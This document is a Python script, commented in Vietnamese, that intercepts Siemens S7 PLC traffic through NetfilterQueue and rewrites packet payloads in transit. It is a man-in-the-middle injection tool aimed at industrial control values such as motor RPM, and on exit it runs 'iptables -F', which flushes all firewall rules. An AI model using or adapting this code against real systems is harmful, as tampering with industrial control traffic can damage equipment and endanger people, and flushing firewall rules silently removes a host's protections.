import os
from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw
# Giả sử file s7_parser.py nằm cùng thư mục
from s7_parser import find_read_var_ackdata_first_item

VALUE_TO_INJECT = 100  # Giá trị bạn muốn ghi đè (ví dụ: 1200 RPM)

def process_packet(packet):
    scapy_pkt = IP(packet.get_payload())
    
    # 1. Nếu không phải TCP hoặc không có Data (Raw), cho qua ngay để tránh trễ
    if not scapy_pkt.haslayer(Raw):
        packet.accept()
        return

    payload = scapy_pkt[Raw].load
    
    # 2. Kiểm tra nhanh xem có phải gói S7 Data không (S7 Header thường bắt đầu bằng 0x32)
    # Nếu là gói Handshake (thường ngắn), ta cũng cho qua luôn
    if len(payload) < 20 or payload[0] != 0x32:
        packet.accept()
        return

    # 3. Tiến hành sửa đổi đơn giản (không qua parser)
    data = bytearray(payload)
    
    try:
        # Cách đơn giản: Chỉ thay đổi byte nếu gói tin đủ lớn (khả năng chứa Data)
        if len(data) > 25:
            # Ví dụ điền đè 2 byte cuối cùng bằng giá trị FF FF (255)
            # Thao tác này giúp kiểm tra xem việc sửa đổi IP/TCP payload có gây ra lỗi gì không
            data[-1] = 0xFF
            data[-2] = 0xFF
            
            scapy_pkt[Raw].load = bytes(data)
            del scapy_pkt[IP].chksum
            del scapy_pkt[TCP].chksum
            
            packet.set_payload(bytes(scapy_pkt))
            print(f"[SUCCESS] Đã sửa đổi gói tin thành công (chế độ đơn giản)")
    except Exception as e:
        print(f"[ERROR] Lỗi khi xử lý gói tin: {e}")

    packet.accept()

def main():
    # Khởi tạo hàng đợi số 1 (khớp với --queue-num 1 trong iptables)
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, process_packet)

    print("[*] Đang chờ traffic S7 trên NFQUEUE số 1...")
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print("\n[*] Đang dừng và dọn dẹp...")
        # Xóa rule iptables khi thoát để mạng trở lại bình thường
        os.system("iptables -F")
        nfqueue.unbind()

if __name__ == "__main__":
    main()